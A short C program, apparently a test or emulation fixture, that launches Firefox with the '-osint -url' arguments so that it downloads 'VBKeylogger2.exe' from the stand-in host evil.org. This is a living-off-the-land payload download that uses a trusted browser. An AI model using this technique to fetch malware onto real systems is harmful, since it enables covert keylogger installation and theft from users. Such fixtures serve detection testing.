#include "helpers.h"
#include <stdio.h>
#include <stdlib.h>


int main() {
    const size_t bufferLen = 300;
    char firefoxPath[bufferLen];
    char *programFilesPath = getenv("ProgramFiles");
    snprintf(firefoxPath, bufferLen, "\"%s\\Mozilla Firefox\\firefox.exe\" -osint -url \"https://www.evil.org/VBKeylogger2.exe\"", programFilesPath);
    return run_command(firefoxPath);
}